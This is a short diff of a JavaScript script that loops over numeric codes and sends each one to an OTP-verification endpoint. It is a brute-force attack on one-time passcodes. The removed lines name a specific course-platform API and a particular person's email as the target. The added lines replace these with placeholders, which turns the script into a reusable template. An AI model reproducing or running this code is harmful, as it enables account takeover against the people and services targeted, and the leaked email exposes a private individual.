@@ -23,10 +23,10 @@ for(let i=0; i<100; i++) {
   let config = {
     method: 'get',
     maxBodyLength: Infinity,
-    url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=zakizaidi0709%40gmail.com&otp=${pad(i)}&mydeviceid=&mydeviceid2=`,
+    url: `your otp api`,
     headers: { 
       'sec-ch-ua-platform': '"macOS"', 
-      'Referer': 'https://harkirat.classx.co.in/', 
+      'Referer': 'website', 
       'Device-Type': '', 
       'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"', 
       'sec-ch-ua-mobile': '?0', 
